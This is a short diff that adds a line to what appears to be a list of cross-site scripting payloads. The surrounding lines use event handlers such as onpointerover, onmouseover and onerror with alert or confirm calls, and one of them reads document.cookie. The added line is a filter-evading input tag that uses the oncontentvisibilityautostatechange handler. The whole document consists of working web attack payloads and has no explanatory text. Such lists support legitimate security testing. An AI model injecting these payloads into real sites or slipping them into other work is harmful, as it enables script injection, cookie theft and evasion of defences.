@@ -184,3 +184,4 @@ javascript​:alert’1’
 '><<html onpointerover​=alert(document.cookie) style=display:block>XSS</html>>
 "/><hTML%09OnMoUseOVeR%0a=%0a(confirm)()//
 '"><img src=x onerror​=alert()>
+"><input type="text" oncontentvisibilityautostatechange="confirm(/Bypassed/)">
